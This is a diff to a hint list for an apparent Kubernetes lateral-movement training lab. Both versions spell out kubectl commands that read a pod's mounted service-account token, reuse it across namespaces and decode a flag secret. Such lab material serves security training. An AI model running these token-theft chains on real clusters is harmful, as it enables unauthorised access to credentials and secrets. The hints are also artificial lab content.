@@ -1,5 +1,1 @@
-[
-  "Start: kubectl exec -n dojo-sec-lateral-a entry-point -- cat /var/run/secrets/kubernetes.io/serviceaccount/token — that's your foothold-sa token",
-  "Use the foothold token to explore namespace B: kubectl get secrets -n dojo-sec-lateral-b --token=<TOKEN> --server=https://kubernetes.default.svc — look for hop-two-token",
-  "Decode hop-two-token: kubectl get secret hop-two-token -n dojo-sec-lateral-b --token=<FOOTHOLD> -o jsonpath='{.data.token}' | base64 -d — then use THAT token to list configmaps in dojo-sec-lateral-c and read final-flag"
-]
+["List pods in dojo-sec-lateral: kubectl get pods -n dojo-sec-lateral — there's a pod (hop1-pod) running as hop1-sa. Its SA token is mounted and has cross-namespace permissions.", "Steal the hop1-sa token: kubectl exec -n dojo-sec-lateral hop1-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/hop1-token — then use it: kubectl --token=$(cat /tmp/hop1-token) get pods -n dojo-sec-lateral-hop2", "Chain: exec into hop2-pod in dojo-sec-lateral-hop2, steal its token, use it to read: kubectl --token=$(cat /tmp/hop2-token) get secret final-treasure -n dojo-sec-lateral-hop3 -o jsonpath='{.data.flag}' | base64 -d"]
